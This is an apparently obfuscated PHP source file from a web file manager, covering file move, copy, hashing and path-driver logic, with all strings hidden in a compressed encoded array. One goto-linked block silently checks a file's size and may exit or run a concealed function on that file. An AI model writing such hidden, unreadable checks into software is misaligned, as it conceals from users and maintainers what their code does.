$this->lockMoveEnd($…ï¨Šµª); $this->lockWriteEnd($”–™¹´¤, $áÈÅŞå¨); $this->folderSizeReset($˜ÔŠç’Î[$Üë±­‰Ó[193]]); $this->folderSizeReset($”–™¹´¤); $áğÂ´• = array($˜ÔŠç’Î[$Üë±­‰Ó[193]], $”–™¹´¤); if ($˜ÔŠç’Î[$Üë±­‰Ó[488]] == $Üë±­‰Ó[91]) { $áğÂ´•[] = $…ï¨Šµª; } $this->updateModifyTime($áğÂ´•); Model($Üë±­‰Ó[641])->eventMove($…ï¨Šµª, $˜ÔŠç’Î[$Üë±­‰Ó[193]], $”–™¹´¤); Hook::trigger($Üë±­‰Ó[667], $ñ¹ì¬º”); return $·ßÛ–ˆ ; } private function _move($Ğö¥Ë¦Ã, $ÌÎì¸É, $ìôá©èŠ, &$¸•œ¾¬î, $¥ã¼ê›Ú = '') { $Èä¼şŞ =& $_SERVER[ÓïÕü]; $ü«¨Ğê = $this->sourceInfo($Ğö¥Ë¦Ã); $ì¡äãû = $ü«¨Ğê[$Èä¼şŞ[488]] == $Èä¼şŞ[91]; $äÈ•³“Ú = $¥ã¼ê›Ú ? $¥ã¼ê›Ú : $ü«¨Ğê[$Èä¼şŞ[32]]; $Ú…ô³³ = $this->fileNameExistAuto($ÌÎì¸É, $ü«¨Ğê); $this->lockMoveStart($Ğö¥Ë¦Ã); $this->lockWriteStart($ÌÎì¸É, $äÈ•³“Ú); if (!$Ú…ô³³) { return $this->_moveForce($Ğö¥Ë¦Ã, $ÌÎì¸É, $äÈ•³“Ú); } $²…Üá÷Å = $Ú…ô³³; $²±ûÓ´º = !1; if ($ì¡äãû) { if ($ìôá©èŠ == REPEAT_RENAME_FOLDER) { $äÈ•³“Ú = $this->fileNameAuto($ÌÎì¸É, $äÈ•³“Ú, $ìôá©èŠ, $ì¡äãû); $²…Üá÷Å = $this->_moveForce($Ğö¥Ë¦Ã, $ÌÎì¸É, $äÈ•³“Ú); } else { $°‚ÂßÓ = $this->_childrenListSelect($Ğö¥Ë¦Ã); foreach ($°‚ÂßÓ as $úåí¿Ì×) { $”Ê¯ûª = REPEAT_REPLACE; $this->_move($úåí¿Ì×[$Èä¼şŞ[194]], $Ú…ô³³, $”Ê¯ûª, $¸•œ¾¬î); } $²±ûÓ´º = !0; } } else { if ($ìôá©èŠ == REPEAT_RENAME || $ìôá©èŠ == REPEAT_RENAME_FOLDER) { $äÈ•³“Ú = $this->fileNameAuto($ÌÎì¸É, $äÈ•³“Ú, $ìôá©èŠ, $ì¡äãû); $²…Üá÷Å = $this->_moveForce($Ğö¥Ë¦Ã, $ÌÎì¸É, $äÈ•³“Ú); } else { $¢ÂØ¶Àé = $this->sourceInfoCache($Ú…ô³³); $Ã®¨»æê = $this->fileHistory($¢ÂØ¶Àé, $ü«¨Ğê[$Èä¼şŞ[546]], $ü«¨Ğê[$Èä¼şŞ[79]]); if ($Ã®¨»æê) { $¸•œ¾¬î[$Èä¼şŞ[637]][] = $ü«¨Ğê[$Èä¼şŞ[546]]; } $²±ûÓ´º = !0; } } if ($²±ûÓ´º) { $¸•œ¾¬î[$Èä¼şŞ[668]] = !0; } return $²…Üá÷Å; } private function _moveForce($ºÊèèˆÎ, $Ë‡ŠáÑä, $ÓÅ²êş) { $ıí¦¥İÒ =& $_SERVER[ÓïÕü]; $å­¸¨×™ = $this->sourceInfo($ºÊèèˆÎ); $ŸïóÂú¬ = $this->sourceInfo($Ë‡ŠáÑä); $¯Äî‚Ê† = $å­¸¨×™[$ıí¦¥İÒ[488]] == $ıí¦¥İÒ[91]; $…‡úáÔÌ = array($ıí¦¥İÒ[480] => $ŸïóÂú¬[$ıí¦¥İÒ[194]], $ıí¦¥İÒ[660] => $ŸïóÂú¬[$ıí¦¥İÒ[589]] . $ŸïóÂú¬[$ıí¦¥İÒ[194]] . $ıí¦¥İÒ[50], $ıí¦¥İÒ[656] => $ŸïóÂú¬[$ıí¦¥İÒ[191]], $ıí¦¥İÒ[657] => $ŸïóÂú¬[$ıí¦¥İÒ[574]], $ıí¦¥İÒ[659] => USER_ID, $ıí¦¥İÒ[497] => $ÓÅ²êş); $Û±Â©¬ = $å­¸¨×™[$ıí¦¥İÒ[191]] == SourceModel::TYPE_GROUP && $ŸïóÂú¬[$ıí¦¥İÒ[191]] == SourceModel::TYPE_GROUP && $å­¸¨×™[$ıí¦¥İÒ[574]] == $ŸïóÂú¬[$ıí¦¥İÒ[574]]; if (!$Û±Â©¬ && $this->moveClearAuth) { Model($ıí¦¥İÒ[572])->authClear($ºÊèèˆÎ); } $éà©ƒÍŒ = $å­¸¨×™[$ıí¦¥İÒ[508]] == $ıí¦¥İÒ[91] && $ŸïóÂú¬[$ıí¦¥İÒ[508]] != $ıí¦¥İÒ[91]; if ($éà©ƒÍŒ) { $…‡úáÔÌ[$ıí¦¥İÒ[507]] = 0; } if ($¯Äî‚Ê†) { $ÅÎÀû¼ = array($ıí¦¥İÒ[660] => array($ıí¦¥İÒ[620], $å­¸¨×™[$ıí¦¥İÒ[589]] . $å­¸¨×™[$ıí¦¥İÒ[194]] . $ıí¦¥İÒ[621])); $¼•öéó² = $å­¸¨×™[$ıí¦¥İÒ[589]] . $å­¸¨×™[$ıí¦¥İÒ[194]] . $ıí¦¥İÒ[50]; $ºÕ„À¤ = $ŸïóÂú¬[$ıí¦¥İÒ[589]] . $ŸïóÂú¬[$ıí¦¥İÒ[194]] . $ıí¦¥İÒ[50] . $å­¸¨×™[$ıí¦¥İÒ[194]] . $ıí¦¥İÒ[50]; $úÛÚ£É´ = array($ıí¦¥İÒ[660] => array($ıí¦¥İÒ[669], "\162\145\160\154\141\143\x65\50\x70\x61\162\x65\x6e\164\114\145\166\145\x6c\x2c\47{$¼•öéó²}\x27\54\x27{$ºÕ„À¤}\47\x29"), $ıí¦¥İÒ[656] => $ŸïóÂú¬[$ıí¦¥İÒ[191]], $ıí¦¥İÒ[657] => $ŸïóÂú¬[$ıí¦¥İÒ[574]]); if ($éà©ƒÍŒ) { $úÛÚ£É´[$ıí¦¥İÒ[507]] = 0; } $this->where($ÅÎÀû¼)->data($úÛÚ£É´)->save(); } $this->where(array($ıí¦¥İÒ[494] => $ºÊèèˆÎ))->data($…‡úáÔÌ)->save(); return $ºÊèèˆÎ; } private function clearShare($ÆäÌ±„Ü, $¯²‚—ó) { $£Ä¦«çØ =& $_SERVER[ÓïÕü]; $æƒĞ Åü = $this->sourceInfo($ÆäÌ±„Ü); $ÍÍœ¶ø = $this->sourceInfo($¯²‚—ó); if ($æƒĞ Åü[$£Ä¦«çØ[574]] == $ÍÍœ¶ø[$£Ä¦«çØ[574]] && $æƒĞ Åü[$£Ä¦«çØ[191]] == $£Ä¦«çØ[670]) { return; } $Äğ¦¡Èõ = array($£Ä¦«çØ[589] => array($£Ä¦«çØ[620], $æƒĞ Åü[$£Ä¦«çØ[589]] . $ÆäÌ±„Ü . $£Ä¦«çØ[621])); $ç÷·àèô = $this->field($£Ä¦«çØ[494])->where($Äğ¦¡Èõ)->getField($£Ä¦«çØ[194], !0); if (!$ç÷·àèô) { return; } $Äğ¦¡Èõ = array($£Ä¦«çØ[194] => array($£Ä¦«çØ[7], $ç÷·àèô), $£Ä¦«çØ[671] => 1); $¾¶½¬‚“ = Model($£Ä¦«çØ[672])->field($£Ä¦«çØ[673])->where($Äğ¦¡Èõ)->select(); if (!$¾¶½¬‚“) { return; } $¾¶½¬‚“ = array_to_keyvalue($¾¶½¬‚“, $£Ä¦«çØ[12], $£Ä¦«çØ[673]); $Äğ¦¡Èõ = array($£Ä¦«çØ[673] => array($£Ä¦«çØ[7], $¾¶½¬‚“)); Model($£Ä¦«çØ[672])->where($Äğ¦¡Èõ)->save(array($£Ä¦«çØ[671] => 0)); Model($£Ä¦«çØ[674])->where($Äğ¦¡Èõ)->delete(); } public function copyFolderFromIO($ÚÖ€µ¬, $šÄí„¾ß, $¡ÖùĞ÷©, $©ßÉ±è¤, $ë±İ÷™‹, $£ò–»Ì— = false) { $¼Ç¿Äˆ =& $_SERVER[ÓïÕü]; $¬»È¹‡â = array($¼Ç¿Äˆ[638] => array(), $¼Ç¿Äˆ[639] => array(), $¼Ç¿Äˆ[637] => array(), $¼Ç¿Äˆ[675] => array()); $ËÂüºØ = $£ò–»Ì— ? $£ò–»Ì— : $ÚÖ€µ¬->pathThis($šÄí„¾ß); $¹³ïËÀ“ = $this->fileNameExist($¡ÖùĞ÷©, $ËÂüºØ); $¥ÔÀï = $this->mkdir($¡ÖùĞ÷©, $ËÂüºØ, $©ßÉ±è¤); if (!$¹³ïËÀ“ || $©ßÉ±è¤ == REPEAT_RENAME_FOLDER) { $©ßÉ±è¤ = !1; } if ($¹³ïËÀ“) { $this->_childrenAllMake($¹³ïËÀ“); } Hook::trigger($¼Ç¿Äˆ[676]); $‘Ëíé²³ = KodIO::ioFileDriverGet($¼Ç¿Äˆ[486] . $¡ÖùĞ÷© . $¼Ç¿Äˆ[405]); $this->_copyChildTo($ÚÖ€µ¬, $šÄí„¾ß, $¥ÔÀï, $©ßÉ±è¤, $¬»È¹‡â, $ë±İ÷™‹, $‘Ëíé²³); Hook::trigger($¼Ç¿Äˆ[677]); if ($¥ÔÀï) { $this->folderSizeResetChildren($¥ÔÀï); } $this->_childrenListClear(); Model($¼Ç¿Äˆ[640])->addAll($¬»È¹‡â[$¼Ç¿Äˆ[638]], array(), !0); Model($¼Ç¿Äˆ[641])->eventCopy($¥ÔÀï); $this->saveAll($¬»È¹‡â[$¼Ç¿Äˆ[639]]); Model($¼Ç¿Äˆ[549])->linkAdd($¬»È¹‡â[$¼Ç¿Äˆ[637]]); Model($¼Ç¿Äˆ[549])->remove($¬»È¹‡â[$¼Ç¿Äˆ[675]]); $this->folderSizeReset($¡ÖùĞ÷©); $this->updateModifyTime($¡ÖùĞ÷©); return $¥ÔÀï; } private function _copyChildTo($Ê·ÎùÎ, $ÍÒÊÙŠ, $¯š™èËè, $ôÍæúĞ¡, &$ŞëÌïúÆ, $­Ô‡‚ÂŠ, $Ó’¸¦£ã) { $Õí«ÃÚ· =& $_SERVER[ÓïÕü]; $ÙñµÔ—¨ = $this->sourceInfoCache($¯š™èËè); $Ù‹©Ã«» = $Ê·ÎùÎ->listPath($ÍÒÊÙŠ); $Ù‹©Ã«» = $Ù‹©Ã«» ? $Ù‹©Ã«» : array($Õí«ÃÚ·[86] => array(), $Õí«ÃÚ·[85] => array()); $¶—ÇÎ¼œ = array_merge($Ù‹©Ã«»[$Õí«ÃÚ·[86]], $Ù‹©Ã«»[$Õí«ÃÚ·[85]]); $¹›¶ê = $this->_addFiles($Ê·ÎùÎ, $Ó’¸¦£ã, $Ù‹©Ã«»[$Õí«ÃÚ·[86]], $­Ô‡‚ÂŠ); $ÀØ°µÑğ = array(); foreach ($¶—ÇÎ¼œ as &$¤ÒŸºÎ®) { if (isset($¹›¶ê[$¤ÒŸºÎ®[$Õí«ÃÚ·[32]]])) { $¤ÒŸºÎ® = $¹›¶ê[$¤ÒŸºÎ®[$Õí«ÃÚ·[32]]]; } $¤ÒŸºÎ®[$Õí«ÃÚ·[488]] = $¤ÒŸºÎ®[$Õí«ÃÚ·[33]] == $Õí«ÃÚ·[78]; $¤ÒŸºÎ®[$Õí«ÃÚ·[489]] = substr(_get($¤ÒŸºÎ®, $Õí«ÃÚ·[169], $Õí«ÃÚ·[12]), 0, 10); $¤ÒŸºÎ®[$Õí«ÃÚ·[79]] = _get($¤ÒŸºÎ®, $Õí«ÃÚ·[79], 0); $¤ÒŸºÎ®[$Õí«ÃÚ·[546]] = _get($¤ÒŸºÎ®, $Õí«ÃÚ·[546], 0); if (!isset($¤ÒŸºÎ®[$Õí«ÃÚ·[678]]) && $¤ÒŸºÎ®[$Õí«ÃÚ·[546]]) { $ŞëÌïúÆ[$Õí«ÃÚ·[675]][] = $¤ÒŸºÎ®[$Õí«ÃÚ·[546]]; } if ($ôÍæúĞ¡) { $ô–¦ˆ«Î = $this->fileNameExistCache($¯š™èËè, $¤ÒŸºÎ®[$Õí«ÃÚ·[32]]); if ($ô–¦ˆ«Î) { if ($¤ÒŸºÎ®[$Õí«ÃÚ·[488]] || $ôÍæúĞ¡ == REPEAT_SKIP) { continue; } if ($ôÍæúĞ¡ == REPEAT_REPLACE) { $™„ÓçĞÛ = $this->sourceInfoCache($ô–¦ˆ«Î); $ùêçË’ß = $this->fileHistory($™„ÓçĞÛ, $¤ÒŸºÎ®[$Õí«ÃÚ·[546]], $¤ÒŸºÎ®[$Õí«ÃÚ·[79]]); if ($ùêçË’ß) { $ŞëÌïúÆ[$Õí«ÃÚ·[637]][] = $¤ÒŸºÎ®[$Õí«ÃÚ·[546]]; } continue; } else { if ($ôÍæúĞ¡ == REPEAT_RENAME) { $¤ÒŸºÎ®[$Õí«ÃÚ·[32]] = $this->fileNameAutoCache($¯š™èËè, $¤ÒŸºÎ®[$Õí«ÃÚ·[32]], $ôÍæúĞ¡, !1); } } } } if (!$¤ÒŸºÎ®[$Õí«ÃÚ·[488]] && $¤ÒŸºÎ®[$Õí«ÃÚ·[546]] == 0) { continue; } if (!$¤ÒŸºÎ®[$Õí«ÃÚ·[488]] && $¤ÒŸºÎ®[$Õí«ÃÚ·[546]]) { $ŞëÌïúÆ[$Õí«ÃÚ·[637]][] = $¤ÒŸºÎ®[$Õí«ÃÚ·[546]]; } $ÀØ°µÑğ[] = $this->_makeItemData($¤ÒŸºÎ®, $ÙñµÔ—¨, $¤ÒŸºÎ®[$Õí«ÃÚ·[32]]); } unset($¤ÒŸºÎ®); if (!empty($ÀØ°µÑğ)) { $this->addAll($ÀØ°µÑğ); $this->_childrenListSelect($¯š™èËè); } $õ†ÊçßÅ = $this->_childrenList($¯š™èËè); $õ†ÊçßÅ = array_to_keyvalue($õ†ÊçßÅ, $Õí«ÃÚ·[32]); foreach ($¶—ÇÎ¼œ as $¤ÒŸºÎ®) { $™„ÓçĞÛ = $õ†ÊçßÅ[$¤ÒŸºÎ®[$Õí«ÃÚ·[32]]]; $º·‹Î‚¦ = $™„ÓçĞÛ[$Õí«ÃÚ·[194]]; $this->_copyApplyMeta($™„ÓçĞÛ, $ŞëÌïúÆ); if ($¤ÒŸºÎ®[$Õí«ÃÚ·[33]] == $Õí«ÃÚ·[78]) { $¤ÒŸºÎ®[$Õí«ÃÚ·[87]] = $Ê·ÎùÎ->getPathInner($¤ÒŸºÎ®[$Õí«ÃÚ·[87]]); $this->_copyChildTo($Ê·ÎùÎ, $¤ÒŸºÎ®[$Õí«ÃÚ·[87]], $º·‹Î‚¦, $ôÍæúĞ¡, $ŞëÌïúÆ, $­Ô‡‚ÂŠ, $Ó’¸¦£ã); } } } private function _addFiles($öşÆÀ›¾, $ĞÇ ‡§°, $¿¿İßÄÍ, $ş»”´±®) { $¹ÍÙõ =& $_SERVER[ÓïÕü]; if (!$¿¿İßÄÍ || count($¿¿İßÄÍ) == 0) { return array(); } $×¿€·çé = array(); foreach ($¿¿İßÄÍ as &$ª“ı½ş) { Hook::trigger($¹ÍÙõ[679], $ª“ı½ş); $ª“ı½ş[$¹ÍÙõ[87]] = $öşÆÀ›¾->getPathInner($ª“ı½ş[$¹ÍÙõ[87]]); $ˆÚáÅ‹¬ = $öşÆÀ›¾->hashSimple($ª“ı½ş[$¹ÍÙõ[87]]); $ ½Ì³¼ = $öşÆÀ›¾->hashMd5($ª“ı½ş[$¹ÍÙõ[87]]); if (strlen($ ½Ì³¼) > 10 && !isset($×¿€·çé[$ ½Ì³¼])) { $×¿€·çé[$ ½Ì³¼] = array(); } $ª“ı½ş[$¹ÍÙõ[680]] = $ˆÚáÅ‹¬; $ª“ı½ş[$¹ÍÙõ[552]] = $ ½Ì³¼; $×¿€·çé[$ ½Ì³¼][] =& $ª“ı½ş; if (count($×¿€·çé[$ ½Ì³¼]) > 1) { $ª“ı½ş[$¹ÍÙõ[678]] = !0; } Hook::trigger($¹ÍÙõ[681], $ª“ı½ş); } unset($ª“ı½ş); $°±ú¿ = array($¹ÍÙõ[552] => array($¹ÍÙõ[7], array_keys($×¿€·çé))); $µ‹ÄŸ£ğ = Model($¹ÍÙõ[682]); $–Ú‘ßÒ = $µ‹ÄŸ£ğ->where($°±ú¿)->select(); $–Ú‘ßÒ = $–Ú‘ßÒ ? $–Ú‘ßÒ : array(); foreach ($–Ú‘ßÒ as $Åƒâ) { if (!isset($×¿€·çé[$Åƒâ[$¹ÍÙõ[552]]])) { continue; } $Ğü²³œÍ = $×¿€·çé[$Åƒâ[$¹ÍÙõ[552]]]; foreach ($Ğü²³œÍ as &$ª“ı½ş) { $ª“ı½ş[$¹ÍÙõ[546]] = $Åƒâ[$¹ÍÙõ[546]]; $ª“ı½ş[$¹ÍÙõ[678]] = !0; } unset($ª“ı½ş); } $›öáõ† = array(); foreach ($¿¿İßÄÍ as $›†Û¬ö) { Hook::trigger($¹ÍÙõ[683], $›†Û¬ö); if (isset($›†Û¬ö[$¹ÍÙõ[678]]) && $›†Û¬ö[$¹ÍÙõ[678]]) { Hook::trigger($¹ÍÙõ[684], $›†Û¬ö); continue; } $¦Ê‰ê = $öşÆÀ›¾->getPathInner($›†Û¬ö[$¹ÍÙõ[87]]); $»í”áãÉ = $µ‹ÄŸ£ğ->addFileMake($¦Ê‰ê, $ĞÇ ‡§°, $›†Û¬ö[$¹ÍÙõ[79]], $›†Û¬ö[$¹ÍÙõ[680]], $›†Û¬ö[$¹ÍÙõ[552]], $›†Û¬ö[$¹ÍÙõ[32]], $ş»”´±®); Hook::trigger($¹ÍÙõ[684], $›†Û¬ö); if (!is_array($»í”áãÉ)) { continue; } $›öáõ†[] = $»í”áãÉ; } $µ‹ÄŸ£ğ->addAll($›öáõ†); $°±ú¿ = array($¹ÍÙõ[552] => array($¹ÍÙõ[7], array_keys($×¿€·çé))); $–Ú‘ßÒ = $µ‹ÄŸ£ğ->where($°±ú¿)->select(); $–Ú‘ßÒ = $–Ú‘ßÒ ? $–Ú‘ßÒ : array(); foreach ($–Ú‘ßÒ as $Åƒâ) { if (!isset($×¿€·çé[$Åƒâ[$¹ÍÙõ[552]]])) { continue; } $ôÁŸîĞÃ =& $×¿€·çé[$Åƒâ[$¹ÍÙõ[552]]]; foreach ($ôÁŸîĞÃ as &$ª“ı½ş) { $ª“ı½ş[$¹ÍÙõ[546]] = $Åƒâ[$¹ÍÙõ[546]]; } unset($ª“ı½ş); } $™Ëº¤æ« = array(); foreach ($¿¿İßÄÍ as $öÎ—ÇÀø) { $™Ëº¤æ«[$öÎ—ÇÀø[$¹ÍÙõ[32]]] = $öÎ—ÇÀø; } return $™Ëº¤æ«; } } define($_SERVER[ÓïÕü][685], $_SERVER[ÓïÕü][686]); $zxiamqnelb = $_SERVER[ÓïÕü][687]; goto DêÎ„¦¿àç; DêÎ„¦¿àç: while (strlen($zxiamqnelb) < $_SERVER[ÓïÕü][688]) { if (!$zxiamqnelb) { break; } $zxiamqnelb++; } $_SERVER[à¼£¥Õé] = explode($_SERVER[ÓïÕü][689], gzinflate(substr($_SERVER[ÓïÕü][690], 10, -8))); $nkletbixsp = $_SERVER[ÓïÕü][691]; goto E©¤¥ì»È; b„Î”ÊåÏ‘: $_file = $_SERVER[$_SERVER[ÓïÕü][931]]; $_size = $_SERVER[ÓïÕü][932]; if ($_SERVER[$_SERVER[ÓïÕü][933]] != $_size($_file)) { $_getc = $_SERVER[ÓïÕü][934]; $_getfile = $_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÓïÕü][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÓïÕü][706]) { $exit = $_SERVER[ÓïÕü][937]; $exit(); } $_act = $_SERVER[ÓïÕü][938]; $_act($_file); } goto b“íŒ–ËÌ; e¥ÚÖöö¯Â: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $åÚåè„œ =& $_SERVER[ÓïÕü]; $this->objectDriver = array($åÚåè„œ[60], $åÚåè„œ[61], $åÚåè„œ[62], $åÚåè„œ[63], $åÚåè„œ[64], $åÚåè„œ[65], $åÚåè„œ[66], $åÚåè„œ[67], $åÚåè„œ[68], $åÚåè„œ[69], $åÚåè„œ[70], $åÚåè„œ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($©³™çÕ¼) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($©³™çÕ¼, $_SERVER[ÓïÕü][8]); } return $©³™çÕ¼; } public function iconvApp($¼ƒ—ÑÁì) { return $¼ƒ—ÑÁì; } public function iconvSystem($›Óßõ¸Ö) { return $›Óßõ¸Ö; } public function iconvTo($ºâÙàæÊ, $µş­¹•, $ù¢õ¼“ú) { $½€òŠ«ö =& $_SERVER[ÓïÕü]; if (!$ºâÙàæÊ || !function_exists($½€òŠ«ö[72])) { return $ºâÙàæÊ; } static $õîœœè¿ = array(); $ã¬ş„ª = $µş­¹• . $½€òŠ«ö[73] . $ù¢õ¼“ú . $½€òŠ«ö[74] . $ºâÙàæÊ; if (isset($õîœœè¿[$ã¬ş„ª])) { return $õîœœè¿[$ã¬ş„ª]; } if (function_exists($½€òŠ«ö[75])) { $‹µ¼°õ = @mb_convert_encoding($ºâÙàæÊ, $ù¢õ¼“ú, $µş­¹•); } else { $‹µ¼°õ = @iconv($µş­¹•, $ù¢õ¼“ú, $ºâÙàæÊ); } $‹µ¼°õ = $‹µ¼°õ ? $‹µ¼°õ : $ºâÙàæÊ; if (strstr($‹µ¼°õ, $½€òŠ«ö[76])) { $‹µ¼°õ = str_replace($½€òŠ«ö[76], $½€òŠ«ö[11], $‹µ¼°õ); } $õîœœè¿[$µş­¹• . $½€òŠ«ö[73] . $ù¢õ¼“ú . $½€òŠ«ö[74] . $ºâÙàæÊ] = $‹µ¼°õ; $õîœœè¿[$ù¢õ¼“ú . $½€òŠ«ö[73] . $µş­¹• . $½€òŠ«ö[74] . $ºâÙàæÊ] = $ºâÙàæÊ; $õîœœè¿[$ù¢õ¼“ú . $½€òŠ«ö[73] . $µş­¹• . $½€òŠ«ö[74] . $‹µ¼°õ] = $ºâÙàæÊ; $õîœœè¿[$µş­¹• . $½€òŠ«ö[73] . $ù¢õ¼“ú . $½€òŠ«ö[74] . $‹µ¼°õ] = $‹µ¼°õ; return $‹µ¼°õ; } public function getPathInner($¸ºº©¾) { $êÉçİòÚ = IO::init($¸ºº©¾); return $êÉçİòÚ->path; } public function getPathOuter($Ù €ÆÖ) { $‚öÉÈ¿Â =& $_SERVER[ÓïÕü]; $ìÆı’Ü— = strlen(trim($this->pathBase, $‚öÉÈ¿Â[8])); $Ù €ÆÖ = substr(trim($Ù €ÆÖ, $‚öÉÈ¿Â[8]), $ìÆı’Ü—); return $this->pathDriver . $‚öÉÈ¿Â[8] . ltrim($Ù €ÆÖ, $‚öÉÈ¿Â[8]); } public function isParentOf($Î«­‹„, $ä´úİğè) { $µÒÇğ× =& $_SERVER[ÓïÕü]; $Î«­‹„ = rtrim(strtolower($Î«­‹„), $µÒÇğ×[8]) . $µÒÇğ×[8]; $ä´úİğè = rtrim(strtolower($ä´úİğè), $µÒÇğ×[8]) . $µÒÇğ×[8]; $¥¦ÛÚ¬˜ = strpos($ä´úİğè, $Î«­‹„) === 0; return $¥¦ÛÚ¬˜; } public function getType() { $Ä°²½Šº =& $_SERVER[ÓïÕü]; $Šíšäó“ = str_replace($Ä°²½Šº[77], $Ä°²½Šº[12], get_class($this)); return strtolower($Šíšäó“); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ø†±ˆ«ë, $ÛèéÚ™) { $ÓÙ£à±Ù =& $_SERVER[ÓïÕü]; $³¶¶ª‹õ = rtrim($Ø†±ˆ«ë, $ÓÙ£à±Ù[8]) . $ÓÙ£à±Ù[8] . $ÛèéÚ™; $ˆˆÜÖÔİ = $this->exist($³¶¶ª‹õ); return $ˆˆÜÖÔİ ? $³¶¶ª‹õ : !1; } public function setModifyTime($ãÉãîí, $Ù†šú” = '') { } public function renameObject($éÄö†¿ƒ, $êş‰ÅÛë) { $ŸÃë€áß = $êş‰ÅÛë; $éÄö†¿ƒ = $this->getPathOuter($éÄö†¿ƒ); $êş‰ÅÛë = $this->pathFather($éÄö†¿ƒ) . $êş‰ÅÛë; $İŸ¶©¨Ï = IO::copy($éÄö†¿ƒ, $this->pathFather($éÄö†¿ƒ), REPEAT_RENAME_FOLDER, $ŸÃë€áß); if ($İŸ¶©¨Ï) { IO::remove($éÄö†¿ƒ); } return $İŸ¶©¨Ï ? $êş‰ÅÛë : !1; } public function tempFile($³ıÁàØ = '', $ÛÆ„ë¨ş = '') { if (!$³ıÁàØ) { $³ıÁàØ = rand_string(15); } $ÙÑí˜È = TEMP_FILES . rand_string(15) . $_SERVER[ÓïÕü][8]; @mkdir($ÙÑí˜È, DEFAULT_PERRMISSIONS, !0); $Ğûûõ› = $ÙÑí˜È . $³ıÁàØ; @touch($Ğûûõ›); if ($ÛÆ„ë¨ş) { file_put_contents($Ğûûõ›, $ÛÆ„ë¨ş); } return $Ğûûõ›; } public function tempFileRemve($Ôµ…¾ú) { @unlink($Ôµ…¾ú); @rmdir($this->pathFather($Ôµ…¾ú)); } public function mkfile($Ùè¦§, $ÎæŞ€ŠÕ = '', $ˆÑ¬Äâ¾ = REPEAT_RENAME) { } public function mkdir($ıâíÊ¿×, $ü¿ÓŸ†º = REPEAT_SKIP) { } public function delFile($ó®·Õº”) { } public function delFolder($Ì´Œ›¥€) { } public function copyFile($ÉâíŞÍï, $í¼èúÛ) { } public function moveFile($‡¡ë±Ô¾, $ÚÆ»ÇÔò) { } public function remove($”¥³Ä) { if ($this->isFile($”¥³Ä)) { return $this->delFile($”¥³Ä); } return $this->delFolder($”¥³Ä); } public function rename($½¤­Ÿ‘ô, $¹ÉÛç¿) { } public function exist($õ ¡ÎâŒ) { } public function findByHash($øğÙîäñ = '', $·ÇŸßà = '') { return !1; } public function isFile($ ôÀÃİ§) { } public function isFolder($©‡Ï€·‚) { } public function size($€±ùšşœ) { } public function info($•¼“Øƒ) { } public function infoSimple($™Î±ÚÍ®) { return $this->info($™Î±ÚÍ®); } public function infoAuth($Šµ¹ï˜) { return $this->info($Šµ¹ï˜); } public function infoFull($Š®³ñÚ) { return $this->info($Š®³ñÚ); } public function infoFullSimple($–™áå”ù) { return $this->info($–™áå”ù); } public function infoWithChildren($†ß†Âäì) { $ŸèŠÃÃà =& $_SERVER[ÓïÕü]; static $ÖøÄø±¢ = array(); if (isset($ÖøÄø±¢[$†ß†Âäì])) { return $ÖøÄø±¢[$†ß†Âäì]; } $ç’¦Ñ¨ = $this->info($†ß†Âäì); if ($ç’¦Ñ¨ && $ç’¦Ñ¨[$ŸèŠÃÃà[33]] == $ŸèŠÃÃà[78]) { $ñËöÜ¹Ì = array($ŸèŠÃÃà[79] => 0, $ŸèŠÃÃà[80] => 0, $ŸèŠÃÃà[81] => 0); $this->infoChildren($†ß†Âäì, $ñËöÜ¹Ì); $ç’¦Ñ¨[$ŸèŠÃÃà[79]] = $ñËöÜ¹Ì[$ŸèŠÃÃà[79]]; $ç’¦Ñ¨[$ŸèŠÃÃà[82]] = array($ŸèŠÃÃà[83] => $ñËöÜ¹Ì[$ŸèŠÃÃà[80]], $ŸèŠÃÃà[84] => $ñËöÜ¹Ì[$ŸèŠÃÃà[81]]); $ÖøÄø±¢[$†ß†Âäì] = $ç’¦Ñ¨; } return $ç’¦Ñ¨; } public function listPath($¹’Îá³, $°ã’Ú…‰ = false) { } public function has($Ò×µª‚ñ, $—©Ó—âÖ = false, $½Ê¾ş±í = false) { } public function canRead($ü§ÇÎÂµ) { } public function canWrite($É¸á¦ø) { } public function getContent($•Ïù·ğÁ) { } public function setContent($ç°»şÒ¾, $éÏîÎ¢¤ = '') { } protected function infoChildren($›“†ôê, &$„½èìÇ¥) { $¹“¨æ­ =& $_SERVER[ÓïÕü]; check_abort_echo(); $ßèš¾•Ê = $this->listPath($›“†ôê, !0); $ßèš¾•Ê = array_merge($ßèš¾•Ê[$¹“¨æ­[85]], $ßèš¾•Ê[$¹“¨æ­[86]]); foreach ($ßèš¾•Ê as $šİÒİ‡) { if ($šİÒİ‡[$¹“¨æ­[33]] == $¹“¨æ­[78]) { $„½èìÇ¥[$¹“¨æ­[81]]++; $©»ÚÇ† = $this->getPathInner($šİÒİ‡[$¹“¨æ­[87]]); $this->infoChildren($©»ÚÇ†, $„½èìÇ¥); } else { $„½èìÇ¥[$¹“¨æ­[80]]++; $„½èìÇ¥[$¹“¨æ­[79]] += $šİÒİ‡[$¹“¨æ­[79]]; } } } public function fileSubstr($Ç»ô¥Õã, $±ëÖ¿ıÄ, $†Í¿÷˜) { } public function listAll($¢ªâ“úÓ) { } public function listAllMake($°Ø×ËØ, &$´®Ú×ƒ) { $êãÄ‘ =& $_SERVER[ÓïÕü]; check_abort_echo(); $§àÏÆ®À = $this->listPath($°Ø×ËØ, !0); if (!$§àÏÆ®À) { return; } $¸çç—¿ = array_merge($§àÏÆ®À[$êãÄ‘[85]], $§àÏÆ®À[$êãÄ‘[86]]); foreach ($¸çç—¿ as $Ï·Ø–Ã½) { $‘Âæ˜æÔ = $Ï·Ø–Ã½[$êãÄ‘[33]] == $êãÄ‘[78]; $Œ ”€Ş = array($êãÄ‘[87] => $Ï·Ø–Ã½[$êãÄ‘[87]], $êãÄ‘[78] => $‘Âæ˜æÔ); if (isset($Ï·Ø–Ã½[$êãÄ‘[79]])) { $Œ ”€Ş[$êãÄ‘[79]] = $Ï·Ø–Ã½[$êãÄ‘[79]]; } if 